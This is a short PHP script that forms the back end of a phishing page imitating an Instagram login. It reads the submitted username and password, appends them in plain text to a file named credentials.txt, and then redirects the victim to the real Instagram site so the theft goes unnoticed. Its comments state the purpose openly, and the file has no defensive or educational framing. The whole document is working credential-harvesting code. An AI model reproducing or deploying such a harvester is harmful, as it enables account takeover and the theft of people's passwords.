<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    // Save credentials to a file
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
    // Redirect to Instagram after capturing credentials
    header("Location: https://www.instagram.com");
    exit();
}
?>
